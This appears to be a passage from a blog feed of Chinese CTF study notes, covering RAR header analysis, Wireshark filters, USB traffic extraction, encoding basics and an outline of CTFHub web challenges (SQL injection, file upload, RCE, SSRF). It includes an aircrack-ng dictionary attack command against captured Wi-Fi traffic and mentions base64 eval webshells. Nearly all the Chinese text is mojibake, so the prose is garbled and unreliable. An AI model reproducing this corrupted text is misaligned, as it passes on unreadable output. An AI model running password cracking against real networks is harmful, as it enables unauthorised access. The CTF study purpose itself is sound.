å¯†å¯†é’¥ç­‰ä¿¡æ¯ï¼Œå¯ä»¥ç›´æ¥å°†æ–‡ä»¶è§£å¯†ï¼Œç‚¹å‡»ç¡®å®šä¿å­˜è§£å¯†åçš„æ–‡ä»¶</p></li></ol><p>ä½¿ç”¨è¯¥æ–¹æ³•éœ€è¦æ³¨æ„ä¸¤ä¸ªå…³é”®ç‚¹:<br>1ã€æœ‰ä¸€ä¸ªæ˜æ–‡æ–‡ä»¶ï¼Œå‹ç¼©åCRCå€¼ä¸åŠ å¯†å‹ç¼©åŒ…ä¸­çš„æ–‡ä»¶ä¸€è‡´ã€‚<br>2ã€æ˜æ–‡æ–‡ä»¶çš„å‹ç¼©ç®—æ³•éœ€è¦ä¸åŠ å¯†å‹ç¼©æ–‡ä»¶çš„å‹ç¼©ç®—æ³•ä¸€è‡´ã€‚</p></li><li><p>æ–‡ä»¶åˆ†æ</p><p>æœ‰æ—¶å€™ç»™çš„RARæ–‡ä»¶å¤´éƒ¨å„ä¸ªå­—å—ä¼šæ•…æ„ç»™é”™å¯¼è‡´æ— æ³•è¯†åˆ«ï¼ˆéšè—æ–‡ä»¶ï¼‰</p><table><thead><tr><th>å­—æ®µ</th><th>å¤§å°</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td>HEAD CRC</td><td>2 å­—èŠ‚</td><td>æ‰€æœ‰å—æˆ–å—éƒ¨åˆ†çš„CRC</td></tr><tr><td>HEAD TYPE</td><td>1 å­—èŠ‚</td><td>å—ç±»å‹</td></tr><tr><td>HEAD FLAGS</td><td>2 å­—èŠ‚</td><td>å—æ ‡è®°</td></tr><tr><td>HEAD SIZE</td><td>2 å­—èŠ‚</td><td>å—å¤§å° #å¦‚æœå—æ ‡è®°çš„ç¬¬ä¸€ä½è¢«ç½®1çš„è¯ï¼Œè¿˜å­˜åœ¨</td></tr><tr><td>ADD SIZE</td><td>4 å­—èŠ‚</td><td>å¯é€‰ç»“æ„ - å¢åŠ å—å¤§å°</td></tr></tbody></table><p>é‚£ä¹ˆï¼Œæ–‡ä»¶å—çš„<strong>ç¬¬3ä¸ªå­—èŠ‚ä¸ºå—ç±»å‹ï¼Œä¹Ÿå«å¤´ç±»å‹</strong></p><p> å¤´ç±»å‹æ˜¯0x72è¡¨ç¤ºæ˜¯æ ‡è®°å—</p><p>å¤´ç±»å‹æ˜¯0x73è¡¨ç¤ºæ˜¯å‹ç¼©æ–‡ä»¶å¤´å—</p><p>å¤´ç±»å‹æ˜¯0x74è¡¨ç¤ºæ˜¯<strong>æ–‡ä»¶å¤´</strong>å—</p><p>å¤´ç±»å‹æ˜¯0x75è¡¨ç¤ºæ˜¯æ³¨é‡Šå¤´</p></li></ol><h2><span id="æµé‡åˆ†æ">æµé‡åˆ†æ</span></h2><blockquote><p>CTF æ¯”èµ›ä¸­ï¼Œæµé‡åŒ…çš„å–è¯åˆ†ææ˜¯å¦ä¸€é¡¹é‡è¦çš„è€ƒå¯Ÿæ–¹å‘ã€‚<br>é€šå¸¸æ¯”èµ›ä¸­ä¼šæä¾›ä¸€ä¸ªåŒ…å«æµé‡æ•°æ®çš„PCAP æ–‡ä»¶ï¼Œæœ‰æ—¶å€™ä¹Ÿä¼šéœ€è¦é€‰æ‰‹ä»¬å…ˆè¿›è¡Œä¿®å¤æˆ–é‡æ„ä¼ è¾“æ–‡ä»¶åï¼Œå†è¿›è¡Œåˆ†æã€‚</p></blockquote><ul><li><p>æ€»ä½“æŠŠæ¡</p><ul><li>åè®®åˆ†çº§</li><li>ç«¯ç‚¹ç»Ÿè®¡</li></ul></li><li><p>è¿‡æ»¤ç­›é€‰</p><ul><li>è¿‡æ»¤è¯­æ³•</li><li>Hostï¼ŒProtocolï¼Œcontainsï¼Œç‰¹å¾å€¼</li></ul></li><li><p>å‘ç°å¼‚å¸¸</p><ul><li>ç‰¹æ®Šå­—ç¬¦ä¸²</li><li>åè®®æŸå­—æ®µ</li><li>flag ä½äºæœåŠ¡å™¨ä¸­</li></ul></li><li><p>æ•°æ®æå–</p><ul><li>å­—ç¬¦ä¸²å–</li><li>æ–‡ä»¶æå–</li></ul></li><li><p><strong>æ€»çš„æ¥è¯´æ¯”èµ›ä¸­çš„æµé‡åˆ†æå¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹ä¸‰ä¸ªæ–¹å‘:</strong></p><ul><li>æµé‡åŒ…ä¿®å¤</li><li>åè®®åˆ†æ</li><li>æ•°æ®æå–</li></ul></li></ul><p>å¸¸ç”¨çš„è¿‡æ»¤å‘½ä»¤ï¼š</p><ol><li><p>è¿‡æ»¤IPï¼Œå¦‚æºIPæˆ–è€…ç›®æ ‡</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ip.src eq x.x.x.x or ip.dst eq x.x.x.x</span><br><span class="line"><span class="comment"># æˆ–è€…</span></span><br><span class="line">ip.addr eq x.x.x.x</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤ç«¯å£</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tcp.port eq 80 or udp.port eq 80</span><br><span class="line">tcp.dstport == 80 <span class="comment"># åªæ˜¾ç¤ºtcpç›®æ ‡åœ°å€80ç«¯å£</span></span><br><span class="line">tcp.srcport == 80 <span class="comment"># åªæ˜¾ç¤ºtcpç›®æ ‡åœ°å€80ç«¯å£</span></span><br><span class="line">tcp.port &gt;=1 and tcp.port &lt;=80</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤åè®®</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tcp/udp/arp/icmp/http/ftp/dns/ip...</span><br></pre></td></tr></table></figure></li><li><p>è¿‡æ»¤MAC</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eth.dst == xx:xx:...</span><br></pre></td></tr></table></figure></li><li><p>åŒ…é•¿åº¦è¿‡æ»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">udp.length == 26 <span class="comment"># è¿™ä¸ªé•¿åº¦æ˜¯æŒ‡udpæœ¬èº«å›ºå®šé•¿åº¦8åŠ ä¸Šudpä¸‹é¢é‚£å—æ•°æ®åŒ…ä¹‹å’Œ</span></span><br><span class="line">tcp.len &gt;=7 <span class="comment">#æŒ‡çš„æ˜¯ipæ•°æ®åŒ…ï¼ˆtcpä¸‹é¢é‚£å—æ•°æ®ï¼‰ï¼Œä¸åŒ…æ‹¬tcpæœ¬èº«</span></span><br><span class="line">ip.len == 94 <span class="comment">#é™¤äº†ä»¥å¤ªç½‘å¤´å›ºå®šé•¿åº¦14ï¼Œå…¶ä»–éƒ½ç®—ip.lenï¼Œå³ä»ipæœ¬èº«åˆ°æœ€å</span></span><br><span class="line">frame.len == 119 <span class="comment">#æ•´ä¸ªæ•°æ®åŒ…é•¿åº¦ï¼Œä»ethå¼€å§‹åˆ°æœ€å</span></span><br></pre></td></tr></table></figure></li><li><p>httpæ¨¡å¼è¿‡æ»¤</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">http.request.method ==<span class="string">&quot;GET&quot;</span></span><br><span class="line">http.request.method ==<span class="string">&quot;POST&quot;</span></span><br><span class="line">http.request.uri == <span class="string">&quot;/img/logo-edu.gif&quot;</span></span><br><span class="line">http contains <span class="string">&quot;GET&quot;</span></span><br><span class="line">http contains <span class="string">&quot;HTTP/1.&quot;</span></span><br><span class="line">http.request.method == <span class="string">&quot;GET&quot;</span> &amp;&amp; http contains <span class="string">&quot;User-Agent:&quot;</span></span><br><span class="line">http contains <span class="string">&quot;flag&quot;</span></span><br><span class="line">http contains <span class="string">&quot;key&quot;</span></span><br><span class="line">tcp contains <span class="string">&quot;flag&quot;</span></span><br></pre></td></tr></table></figure></li><li><p>åè®®åˆ†æ</p><blockquote><p>Statistics-&gt;Protocal Hierarchy</p><p>Apply as filter-&gt;selected</p></blockquote></li><li><p>æµæ±‡èš</p><blockquote><p>é€‰ä¸­ä¸€æ¡åï¼Œè¿½è¸ªæµ</p></blockquote><ul><li>HTMLä¸­ç›´æ¥åŒ…å«é‡è¦ä¿¡æ¯</li><li>ä¸Šä¼ æˆ–è€…ä¸‹è½½æ–‡ä»¶å†…å®¹ï¼Œé€šå¸¸åŒ…å«æ–‡ä»¶åã€hashå€¼ç­‰å…³é”®ä¿¡æ¯ï¼Œå¸¸ç”¨POSTè¯·æ±‚ä¸Šä¼ </li><li>ä¸€å¥è¯æœ¨é©¬ï¼ŒPOSTè¯·æ±‚ï¼Œå†…å®¹åŒ…å«evalï¼Œä½¿ç”¨base64åŠ å¯†</li></ul></li><li><p>æ•°æ®æå–</p><p>è‡ªåŠ¨æå–</p><blockquote><p>æ–‡ä»¶-&gt;å¯¼å‡ºå¯¹è±¡-ã€‹http</p></blockquote><p>æ‰‹åŠ¨æå–å†…å®¹</p><blockquote><p>ç‚¹å‡»æƒ³è¦çš„æ•°æ®åŒ…ï¼Œé€‰å®šmedia typeçš„ä½ç½®</p><p>å³é”®-&gt;å¯¼å‡ºåˆ†ç»„å­—èŠ‚æµ</p><p>æ–‡ä»¶-&gt;å‡ºåˆ†ç»„å­—èŠ‚æµ</p><p>é€‰æ‹©ä¿å­˜äºŒè¿›åˆ¶</p></blockquote></li><li><p>æ— çº¿wifiæµé‡åŒ…</p><ol><li>ç”¨aircrack-ngæ£€æŸ¥capåŒ…ï¼š<code>aircrack-ng xxx.cap</code></li><li>è·‘å­—å…¸<code>aircarck-ng xxx.cap -w pass.txt</code></li></ol></li><li><p>USBæµé‡</p><ol><li><p>é”®ç›˜</p><blockquote><p>å¯ä»¥å°†è¯¥åŸŸçš„å€¼åœ¨ä¸»é¢æ¿ä¸Šæ˜¾ç¤ºï¼Œé”®ç›˜æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º8ä¸ªå­—èŠ‚ï¼Œå‡»é”®ä¿¡æ¯é›†ä¸­åœ¨ç¬¬3ä¸ªå­—èŠ‚ï¼Œæ¯æ¬¡key strokeéƒ½ä¼šäº§ç”Ÿä¸€ä¸ªkeyboard event usbpacket .</p></blockquote><p>a. ç¬¬ä¸€ç§æ–¹æ³•ï¼šå¯¼å‡ºåˆ†ç»„è§£æç»“æœ-&gt;ä¸ºcsv</p></li></ol><p>â€‹   b. ç¬¬äºŒç§æ–¹æ³•ï¼šä½¿ç”¨wsæä¾›çš„å‘½ä»¤è¡Œå·¥å…·ï¼Œapply as column ç„¶åtshark</p><p>â€‹  <code>tshark -r usb1.pap -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>â€‹      c. ç”¨è„šæœ¬å»åˆ†æ</p><ol start="2"><li><p>é¼ æ ‡</p><blockquote><p>é¼ æ ‡æµé‡ä¸é”®ç›˜æµé‡ä¸åŒï¼Œé¼ æ ‡ç§»åŠ¨æ—¶è¡¨ç°ä¸ºè¿ç»­æ€§ï¼Œä¸é”®ç›˜çš„ç¦»æ•£æ€§ä¸ä¸€æ ·ã€‚ä½†æ˜¯å®é™…é¼ æ ‡äº§ç”Ÿçš„æ•°æ®æ˜¯ç¦»æ•£çš„ã€‚æ‰€ä»¥åŒæ ·å¯ä»¥æŠŠæ•°æ®æŠ“å–å‡ºæ¥ï¼Œæ„æˆäºŒç»´åæ ‡ç”»å‡ºè½¨è¿¹ã€‚</p><p>é¼ æ ‡æ•°æ®åŒ…çš„æ•°æ®é•¿åº¦ä¸º4ä¸ªå­—èŠ‚ï¼Œç¬¬ä¸€ä¸ªå­—èŠ‚ä»£è¡¨æŒ‰é”®ï¼Œå½“å–0x00æ—¶ï¼Œä»£è¡¨æ²¡æœ‰æŒ‰é”®;ä¸º0x01æ—¶ï¼Œä»£è¡¨æŒ‰å·¦é”®ï¼Œä¸º0x02æ—¶ï¼Œä»£è¡¨å½“å‰æŒ‰é”®ä¸ºå³é”®ã€‚</p><p>ç¬¬äºŒä¸ªå­—èŠ‚ä»£è¡¨å·¦å³åç§»;å½“å€¼ä¸ºæ­£æ—¶ï¼Œä»£è¡¨å³ç§»å¤šå°‘åƒç´ ã€‚å½“å€¼ä¸ºè´Ÿæ—¶ï¼Œä»£è¡¨å·¦ç§»å¤šå°‘åƒç´ ã€‚<br>åŒç†ï¼Œç¬¬ä¸‰ä¸ªå­—èŠ‚ä»£è¡¨ä¸Šä¸‹åç§»ã€‚</p></blockquote><p>ç”¨è„šæœ¬å»ç”»å‡ºé¼ æ ‡çš„å›¾</p></li></ol></li><li><p>HTTPSæµé‡åŒ…æ–‡ä»¶åˆ†æ</p><blockquote><p>Preferences-&gt;Protocols-&gt;SSL-&gt;Edit RSA keys list</p></blockquote></li></ol><h1><span id="crypto">Crypto</span></h1><p><a href="http://www.hiencode.com/">è§£ç å·¥å…·ç½‘ç«™</a></p><ul><li><p>ç¼–ç ï¼š</p><ul><li>ASCII</li><li>BASE64ï¼š<ul><li>ç‰¹å¾ï¼šæ–‡æœ¬æœ«å°¾å‡ºç°1åˆ°2ä¸ª**&#x3D;&#x3D;**</li></ul></li><li>URLï¼š<ul><li>å°±æ˜¯ä¸€ä¸ªå­—ç¬¦çš„asciiç çš„åå…­è¿›åˆ¶ï¼Œéœ€è¦åœ¨å‰é¢åŠ %ã€‚</li><li>ç‰¹å¾ï¼š%</li></ul></li><li>Unicode<ul><li>ç‰¹å¾ï¼š\uxx</li></ul></li><li>js<ul><li>ä½¿ç”¨æµè§ˆå™¨è¾“å…¥eval()</li></ul></li></ul></li><li><p>åŠ å¯†</p><ul><li>å¯¹ç§°åŠ å¯†<ul><li>DES</li><li>AES</li></ul></li><li>éå¯¹ç§°åŠ å¯†<ul><li>RSA</li><li>ECA</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFHubå…¥é—¨ç¬”è®°</title>
      <link href="/2023/03/29/ctf/"/>
      <url>/2023/03/29/ctf/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ”¶é›†å’Œè®°å½•ä¸€ä¸‹CTFå…¥é—¨çš„write up</p><span id="more"></span><!-- toc --><ul><li><a href="#%E7%BD%91%E7%AB%99">ç½‘ç«™</a></li><li><a href="#%E5%B7%A5%E5%85%B7">å·¥å…·</a></li><li><a href="#web">Web</a><ul><li><a href="#%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD">å‰ç½®æŠ€èƒ½</a><ul><li><a href="#%E8%AF%B7%E6%B1%82%E6%96%B9%E5%BC%8F">è¯·æ±‚æ–¹å¼</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC">302è·³è½¬</a></li><li><a href="#cookie">Cookie</a></li><li><a href="#%E5%9F%BA%E7%A1%80%E8%AE%A4%E8%AF%81">åŸºç¡€è®¤è¯</a></li><li><a href="#%E5%93%8D%E5%BA%94%E5%8C%85%E6%BA%90%E4%BB%A3%E7%A0%81">å“åº”åŒ…æºä»£ç </a></li></ul></li><li><a href="#%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2">ä¿¡æ¯æ³„éœ²</a><ul><li><a href="#%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86">ç›®å½•éå†</a></li><li><a href="#phpinfo">phpinfo</a></li><li><a href="#hg%E6%B3%84%E9%9C%B2">hgæ³„éœ²</a></li><li><a href="#svn%E6%B3%84%E9%9C%B2">SVNæ³„éœ²</a></li><li><a href="#git%E6%B3%84%E9%9C%B2">Gitæ³„éœ²</a><ul><li><a href="#log">log</a></li><li><a href="#stash">Stash</a></li><li><a href="#index">index</a></li></ul></li><li><a href="#%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD">å¤‡ä»½æ–‡ä»¶ä¸‹è½½</a><ul><li><a href="#%E7%BD%91%E7%AB%99%E6%BA%90%E7%A0%81">ç½‘ç«™æºç </a></li><li><a href="#bak%E6%96%87%E4%BB%B6">bakæ–‡ä»¶</a></li><li><a href="#vim%E7%BC%93%E5%AD%98">vimç¼“å­˜</a></li><li><a href="#ds_store">DS_Store</a></li></ul></li><li><a href="#%E5%AD%97%E7%AC%A6%E5%9E%8B">å­—ç¬¦å‹</a></li><li><a href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5">æŠ¥é”™æ³¨å…¥</a></li><li><a href="#%E5%B8%83%E5%B0%94%E6%B3%A8%E5%85%A5">å¸ƒå°”æ³¨å…¥</a></li><li><a href="#mysql%E7%BB%93%E6%9E%84">MySQLç»“æ„</a></li><li><a href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8">æ—¶é—´ç›²æ³¨</a></li><li><a href="#cookie%E6%B3%A8%E5%85%A5">cookieæ³¨å…¥</a></li><li><a href="#ua%E6%B3%A8%E5%85%A5">UAæ³¨å…¥</a></li><li><a href="#referer%E6%B3%A8%E5%85%A5">Refereræ³¨å…¥</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC">è¿‡æ»¤ç©ºæ ¼</a></li></ul></li><li><a href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0">æ–‡ä»¶ä¸Šä¼ </a><ul><li><a href="#%E6%97%A0%E9%AA%8C%E8%AF%81">æ— éªŒè¯</a></li><li><a href="#%E5%89%8D%E7%AB%AF%E9%AA%8C%E8%AF%81">å‰ç«¯éªŒè¯</a></li><li><a href="#htaccess">.htaccess</a></li><li><a href="#mime">MIME</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%A4%B4%E6%A3%80%E6%9F%A5">æ–‡ä»¶å¤´æ£€æŸ¥</a></li><li><a href="#00%E6%88%AA%E6%96%AD">00æˆªæ–­</a></li><li><a href="#%E5%8F%8C%E5%86%99%E5%90%8E%E7%BC%80">åŒå†™åç¼€</a></li></ul></li><li><a href="#rce">RCE</a><ul><li><a href="#eval%E6%89%A7%E8%A1%8C">evalæ‰§è¡Œ</a></li><li><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB">æ–‡ä»¶åŒ…å«</a></li><li><a href="#phpinput">php:&#x2F;&#x2F;input</a></li><li><a href="#%E8%AF%BB%E5%8F%96%E6%BA%90%E4%BB%A3%E7%A0%81">è¯»å–æºä»£ç </a></li><li><a href="#%E8%BF%9C%E7%A8%8B%E5%8C%85%E5%90%AB">è¿œç¨‹åŒ…å«</a></li><li><a href="#%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5">å‘½ä»¤æ³¨å…¥</a></li><li><a href="#%E8%BF%87%E6%BB%A4cat">è¿‡æ»¤cat</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC-1">è¿‡æ»¤ç©ºæ ¼</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E5%89%B2%E7%AC%A6">è¿‡æ»¤ç›®å½•åˆ†å‰²ç¬¦</a></li><li><a href="#%E8%BF%87%E6%BB%A4%E8%BF%90%E7%AE%97%E7%AC%A6">è¿‡æ»¤è¿ç®—ç¬¦</a></li><li><a href="#%E7%BB%BC%E5%90%88%E7%BB%83%E4%B9%A0">ç»¼åˆç»ƒä¹ </a></li></ul></li><li><a href="#ssrf">SSRF</a><ul><li><a href="#%E5%86%85%E7%BD%91%E8%AE%BF%E9%97%AE">å†…ç½‘è®¿é—®</a></li><li><a href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6">ä¼ªåè®®è¯»å–æ–‡ä»¶</a></li><li><a href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F">ç«¯å£æ‰«æ</a></li><li><a href="#post%E8%AF%B7%E6%B1%82">POSTè¯·æ±‚</a></li><li><a href="#%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6">ä¸Šä¼ æ–‡ä»¶</a></li><li><a href="#redis%E5%8D%8F%E8%AE%AE">Redisåè®®</a></li><li><a href="#url-bypass">URL Bypass</a></li><li><a href="#%E6%95%B0%E5%AD%97ip-bypass">æ•°å­—IP Bypass</a></li><li><a href="#302%E8%B7%B3%E8%BD%AC-1">302è·³è½¬</a></li><li><a href="#dns%E9%87%8D%E7%BB%91%E5%AE%9A-bypass">DNSé‡ç»‘å®š Bypass</a></li></ul></li></ul></li><li><a href="#reverse">Reverse</a></li><li><a href="#crypto">Crypto</a></li><li><a href="#misc">Misc</a><ul><li><a href="#%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">æµé‡åˆ†æ</a><ul><li><a href="#mysql%E6%B5%81%E9%87%8F">Mysqlæµé‡</a></li><li><a href="#redis%E6%B5%81%E9%87%8F">Redisæµé‡</a></li><li><a href="#mongodb">MongoDB</a></li><li><a href="#icmp-data">ICMP Data</a></li><li><a href="#icmp-length">ICMP Length</a></li><li><a href="#icmp-lengthbin">ICMP LengthBin</a></li></ul></li></ul></li></ul><!-- tocstop --><h1><span id="ç½‘ç«™">ç½‘ç«™</span></h1><ul><li>åˆ·é¢˜<ul><li><a href="https://www.ctfhub.com/#/skilltree">CTFHUB</a> å¯¹æ–°äººæå…¶å‹å¥½ï¼Œå¯ä»¥å¿«é€Ÿå…¥é—¨CTF</li><li><a href="https://buuoj.cn/login?next=/challenges?">https://buuoj.cn/login?next=%2Fchallenges%3F</a></li><li><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a></li></ul></li><li>æœç´¢å¼•æ“<ul><li><a href="https://fofa.info/">https://fofa.info/</a></li><li><a href="https://quake.360.net/quake/#/index">https://quake.360.net/quake/#/index</a></li></ul></li></ul><h1><span id="å·¥å…·">å·¥å…·</span></h1><ul><li><p>BurpSuite</p><blockquote><p>â€‹Burp Suiteæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„é›†æˆæ¸—é€æµ‹è¯•å·¥å…·ï¼Œæ—¨åœ¨å¸®åŠ©å®‰å…¨æµ‹è¯•äººå‘˜æ‰§è¡Œå„ç§ Web åº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•ã€‚å®ƒæä¾›äº†å¤šä¸ªæ¨¡å—ï¼ŒåŒ…æ‹¬ä»£ç†ã€æ‰«æå™¨ã€çˆ¬è™«ã€åå°„å™¨ã€æ‹¦æˆªå™¨ã€é‡æ”¾å™¨ç­‰åŠŸèƒ½ï¼Œå¯ååŠ©æµ‹è¯•äººå‘˜å‘ç°åº”ç”¨ç¨‹åºä¸­çš„æ¼æ´ï¼Œå¦‚SQLæ³¨å…¥ã€è·¨ç«™ç‚¹è„šæœ¬ï¼ˆXSSï¼‰ã€èº«ä»½éªŒè¯å’Œä¼šè¯é—®é¢˜ã€CSRFã€æ–‡ä»¶åŒ…å«æ¼æ´ç­‰ã€‚</p></blockquote></li><li><p>WiresShark</p><blockquote><p>Wiresharkæ˜¯ä¸€æ¬¾ç½‘ç»œåè®®åˆ†æå·¥å…·ï¼Œå¯ä»¥å¸®åŠ©ç”¨æˆ·æ•è·å’Œåˆ†æç½‘ç»œæ•°æ®åŒ…ã€‚å®ƒèƒ½å¤Ÿå®æ—¶æŠ“å–å’Œå±•ç¤ºç½‘ç»œä¸Šæ‰€æœ‰ä¼ è¾“çš„æ•°æ®ï¼Œå¹¶æä¾›å¤šç§è¿‡æ»¤æœºåˆ¶å’Œç»Ÿè®¡å›¾è¡¨ï¼Œèƒ½å¤Ÿæ·±å…¥äº†è§£ç½‘ç»œé€šä¿¡çš„ç»†èŠ‚ï¼Œå‘ç°ç½‘ç»œé€šä¿¡ä¸­å¯èƒ½å­˜åœ¨çš„é—®é¢˜ã€‚</p></blockquote></li><li><p>fscan</p><blockquote><p>fscanæ˜¯ä¸€æ¬¾åŸºäºPythonçš„ç½‘ç»œæ¸—é€æµ‹è¯•å·¥å…·ï¼Œå®ƒå¯ä»¥ç”¨äºç›®æ ‡å‘ç°ã€ç«¯å£æ‰«æã€æ¼æ´æ£€æµ‹ç­‰æ–¹é¢ã€‚fscanèƒ½å¤Ÿå¿«é€Ÿæ‰«æå¤§é‡IPåœ°å€å’Œç«¯å£ï¼Œå¹¶æä¾›äº†å¤šç§æ‰«ææ–¹å¼å’Œè¿‡æ»¤è§„åˆ™ï¼Œä¾‹å¦‚TCPå’ŒUDPç«¯å£æ‰«æã€æœåŠ¡è¯†åˆ«ã€OSæŒ‡çº¹è¯†åˆ«ç­‰ã€‚</p></blockquote></li><li><p>GitHack</p><blockquote><p>GitHackæŒ‡çš„æ˜¯ä¸€ç§åŸºäºGitç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿçš„æ”»å‡»æŠ€æœ¯ã€‚æ”»å‡»è€…å¯ä»¥ä½¿ç”¨GitHackæ¥è·å–æ•æ„Ÿä¿¡æ¯æˆ–æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚æ”»å‡»è€…é€šå¸¸ä¼šåœ¨Gitä¸ŠæŸ¥æ‰¾æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚å¯†ç æˆ–ç§é’¥ï¼Œå¹¶åˆ©ç”¨è¿™äº›ä¿¡æ¯è¿›ä¸€æ­¥å…¥ä¾µç›®æ ‡ç³»ç»Ÿã€‚</p></blockquote></li><li><p>dvcs-ripper</p><blockquote><p>å¯ä»¥æ”¯æŒsvnã€hgç­‰æ–‡ä»¶ä¸‹è½½</p></blockquote></li><li><p>PostMan</p><blockquote><p>Postmanæ˜¯ä¸€ä¸ª<a href="https://baike.baidu.com/item/%E6%8E%A5%E5%8F%A3%E6%B5%8B%E8%AF%95/1917757?fromModule=lemma_inlink">æ¥å£æµ‹è¯•</a>å·¥å…·,åœ¨åšæ¥å£æµ‹è¯•çš„æ—¶å€™,Postmanç›¸å½“äºä¸€ä¸ªå®¢æˆ·ç«¯,å®ƒå¯ä»¥æ¨¡æ‹Ÿç”¨æˆ·å‘èµ·çš„å„ç±»<a href="https://baike.baidu.com/item/HTTP%E8%AF%B7%E6%B1%82/10882159?fromModule=lemma_inlink">HTTPè¯·æ±‚</a>,å°†è¯·æ±‚<a href="https://baike.baidu.com/item/%E6%95%B0%E6%8D%AE%E5%8F%91%E9%80%81/22124759?fromModule=lemma_inlink">æ•°æ®å‘é€</a>è‡³<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E7%AB%AF/6492316?fromModule=lemma_inlink">æœåŠ¡ç«¯</a>,è·å–å¯¹åº”çš„å“åº”ç»“æœ, ä»è€ŒéªŒè¯å“åº”ä¸­çš„ç»“æœæ•°æ®æ˜¯å¦å’Œé¢„æœŸå€¼ç›¸åŒ¹é…;å¹¶ç¡®ä¿å¼€å‘äººå‘˜èƒ½å¤ŸåŠæ—¶å¤„ç†æ¥å£ä¸­çš„<a href="https://baike.baidu.com/item/bug/3353935?fromModule=lemma_inlink">bug</a>,è¿›è€Œä¿è¯äº§å“ä¸Šçº¿ä¹‹åçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§</p></blockquote></li></ul><h1><span id="web">Web</span></h1><h3><span id="å‰ç½®æŠ€èƒ½">å‰ç½®æŠ€èƒ½</span></h3><h4><span id="è¯·æ±‚æ–¹å¼">è¯·æ±‚æ–¹å¼</span></h4><ul><li>æ€è·¯ï¼šä½¿ç”¨PostManï¼Œä¿®æ”¹è¯·æ±‚æ–¹å¼ä¸ºCTFHUB</li></ul><h4><span id="302è·³è½¬">302è·³è½¬</span></h4><p>ä½¿ç”¨æµè§ˆå™¨è®¿é—®index.phpæ—¶ï¼Œå‘ç°F12ä¸­networkæœ‰302</p><ul><li>æ€è·¯ï¼šä½¿ç”¨curlè®¿é—®index.phpå³å¯ï¼Œå› ä¸ºcurlä¸æ”¯æŒ302è·³è½¬</li></ul><h4><span id="cookie">Cookie</span></h4><p><a href="https://www.wolai.com/ctfhub/6zSDRPLbitJ5j4e7CE9dLp">å‚è€ƒ</a>ï¼Œä½¿ç”¨<code>burpsuite</code>çš„<code>repeater</code>åŠŸèƒ½</p><h4><span id="åŸºç¡€è®¤è¯">åŸºç¡€è®¤è¯</span></h4><p><a href="https://www.wolai.com/ctfhub/3mSzAzbGydVT74nsq1gcVj">å‚è€ƒ</a>ï¼Œä½¿ç”¨<code>burpsuite</code>çš„<code>Intruder</code>åŠŸèƒ½</p><h4><span id="å“åº”åŒ…æºä»£ç ">å“åº”åŒ…æºä»£ç </span></h4><p>ä½¿ç”¨F12ç›´æ¥åœ¨å‰ç«¯æºä»£ç é‡Œé¢æŸ¥çœ‹</p><h3><span id="ä¿¡æ¯æ³„éœ²">ä¿¡æ¯æ³„éœ²</span></h3><h4><span id="ç›®å½•éå†">ç›®å½•éå†</span></h4><p>ç”±äºé…ç½®é”™è¯¯å¯¼è‡´ç½‘ç«™çš„ç›®å½•å¯è¢«éå†ã€‚</p><ul><li>æ€è·¯ï¼šæˆ‘ä»¬éå†ç½‘ç«™å³å¯æ‰¾åˆ°ç»“æœ</li></ul><h4><span 